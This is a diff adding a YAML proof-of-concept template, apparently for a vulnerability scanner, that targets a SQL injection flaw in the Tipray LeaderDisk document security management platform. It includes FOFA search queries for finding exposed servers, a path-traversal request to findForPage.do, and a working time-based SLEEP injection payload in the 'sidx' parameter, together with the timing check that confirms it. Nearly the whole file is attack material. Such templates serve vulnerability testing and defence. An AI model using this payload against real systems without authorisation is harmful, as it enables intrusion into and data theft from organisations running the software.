@@ -1,0 +1,20 @@
+id: poc-yaml-tipray-dsmp-findforpage-do-sqli
+info:
+  name: 天锐绿盘文档安全管理平台 findForPage.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天锐绿盘文档安全管理平台
+  fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /lddsm/service/../admin/bfclConfig/findForPage.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP({{.t1}})))x)
+  expression: status_code == 200 && contains(body,"\"page\":") && contains(body,"\"name\":")
+    && contains(content_type,"application/json") && duration > t1 && duration < t2
+transport: http
